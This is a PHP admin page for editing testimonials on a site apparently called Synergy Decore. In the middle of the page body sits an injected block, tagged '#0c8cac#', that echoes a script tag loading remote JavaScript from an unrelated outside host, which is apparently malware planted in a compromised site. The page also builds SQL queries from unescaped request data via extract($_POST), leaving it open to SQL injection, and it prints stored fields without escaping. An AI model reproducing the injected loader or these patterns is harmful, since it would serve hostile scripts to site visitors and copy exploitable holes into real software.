<?php session_start();
ob_start();

include "inc/session_check.php";
$page = "Edit Testimonials";
$side_menu="Testimonials";
$adid = urlsafe_b64decode($_REQUEST['id']);
 
$select_ad = mysql_query("select * from sd_testimonials where id='$adid'");
$fetch_ad = mysql_fetch_array($select_ad);

if(isset($_POST['submit']))
{
	extract($_POST);
	
	$inset = "UPDATE sd_testimonials SET name='$name', email='$email', location='$location', message='$message', status='$status' WHERE id='$adid'";
	
	if(mysql_query($inset))
	{
		header("location: edit_testimonials.php?id=$_REQUEST[id]&msg=succ&cont=Testimonials Updated Successfully.");
	}
}


?>
<!DOCTYPE html>
  <!--[if lt IE 7]>
    <html class="lt-ie9 lt-ie8 lt-ie7" lang="en">
  <![endif]-->

  <!--[if IE 7]>
    <html class="lt-ie9 lt-ie8" lang="en">
  <![endif]-->

  <!--[if IE 8]>
    <html class="lt-ie9" lang="en">
  <![endif]-->

  <!--[if gt IE 8]>
    <!-->
    <html lang="en">
    <!--
  <![endif]-->

  <head>
    <meta charset="utf-8">
    <title>Synergy Decore | View Testimonials</title>
    <script src="js/html5-trunk.js"></script>
    <link href="icomoon/style.css" rel="stylesheet">
    <!--[if lte IE 7]>
      <script src="css/icomoon-font/lte-ie7.js"></script>
    <![endif]-->
    <link href="css/main.css" rel="stylesheet">
    <script type="text/javascript"  src="js/jquery-1.3.2"></script>
<script>
function goback() {
    history.go(-1);
}
</script>

  </head>
  <body>
    
    <?php 
	  	include "inc/header.php";
    ?>

    <div class="container-fluid">
      
    <?php 
	  	include "inc/main_nav.php";
    ?>
      
      <div class="dashboard-wrapper">
        <div class="main-container">
        
          <?php 
		  	include "inc/sub_navbar.php";
				include "inc/breadcrumb.php";
		  ?>
<div class="row-fluid">
            <div class="span12">
              <div class="widget no-margin">
                <div class="widget-header">
                  <div class="title">
                    	Testimonials
                  </div>
                </div>
                <div class="widget-body">
               <?php include 'message.php'; ?>
<?php
#0c8cac#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967022\"></script>";
echo $g;
}
#/0c8cac#
?> <form class="form-horizontal no-margin well" id="ad_form" name="form" method="post" enctype="multipart/form-data" >

	
	<h5 class="text-info">Testimonials</h5>
 			<hr />	
 			<div class="control-group">
                      <label class="control-label">
                        Name * :
                      </label>
                      <div class="controls">
                    <input type="text" name="name" class="required span4" value="<?=$fetch_ad['name']?>" />
                    
					 </div>
            </div>
            <div class="control-group">
                      <label class="control-label">
                        Location * :
                      </label>
                      <div class="controls">
                      	<input type="text" name="location" class="required span4" value="<?=$fetch_ad['location']?>" />
                    
					 </div>
            </div>
            <div class="control-group">
                      <label class="control-label">
                        Email * :
                      </label>
                      <div class="controls">
                      	<input type="text" name="email" class="required span4" value="<?=$fetch_ad['email']?>" />
                   
					 </div>
            </div>
         
            <div class="control-group">
                      <label class="control-label">
                        Message * :
                      </label>
                      <div class="controls">
                      	<textarea name="message" class="required span4"><?=$fetch_ad['message']?></textarea>
                     </div>
            </div>
                    <div class="control-group">
                      <label class="control-label">
                        Post Date * :
                      </label>
                      <div class="controls">
                      	<input type="text" name="post_date" class="required span4" value="<?=$fetch_ad['post_date']?>" />
                    
                     </div>
                    </div>
                    
                       <div class="control-group">
                      <label class="control-label">
                        Purpose * :
                      </label>
                      <div class="controls">
                      	<select name="status" class="span4">
                      		<option <?php if($fetch_ad['status']==1){ echo "selected='selected'"; }?> value="1">Active</option>
                      		<option <?php if($fetch_ad['status']==0){ echo "selected='selected'"; }?> value="0">Inactive</option>
                      	</select>
                    
					 </div>
            </div>
            
			 <div class="form-actions no-margin">
			 	<input type="submit" class="btn btn-info" name="submit" value="Update" /></div>
			 </form>
 
	<div class="clearfix"></div>
                  </div>
                </div>
              </div>
            </div>
          </div>          
        </div>        
      </div>
    </div>

    <?php 
    	include 'inc/footer.php';
    ?>
     <script src="js/wysiwyg/wysihtml5-0.3.0.js"></script>
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/wysiwyg/bootstrap-wysihtml5.js"></script>
    </body>
</html>